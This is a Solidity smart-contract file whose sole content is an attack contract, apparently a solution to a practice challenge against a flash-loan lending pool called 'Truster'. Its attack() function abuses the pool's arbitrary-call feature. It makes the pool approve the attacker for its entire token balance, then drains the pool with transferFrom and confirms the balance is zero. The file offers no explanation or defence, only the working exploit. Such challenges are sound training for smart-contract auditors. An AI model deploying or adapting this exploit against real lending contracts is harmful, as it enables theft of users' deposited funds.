// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface Ilender {
    function flashLoan(
        uint256 amount,
        address borrower,
        address target,
        bytes calldata data
    ) external returns (bool);
}

interface IERC20 {
    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external returns (bool);

    function approve(address spender, uint256 value) external returns (bool);

    function balanceOf(address account) external view returns (uint256);
}

contract AttackTrusterLender {
    function attack(address pool, address token) external {
        // Set data
        uint256 balancePool = IERC20(token).balanceOf(pool);
        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this),
            balancePool
        );
        // Calling fashloan
        Ilender(pool).flashLoan(0, msg.sender, token, data);

        // after fashloan done we transfer token to our

        IERC20(token).transferFrom(pool, msg.sender, balancePool);

        uint256 balancePoolBefore = IERC20(token).balanceOf(pool);

        require(balancePoolBefore == 0, "Hackfaild");
    }
}
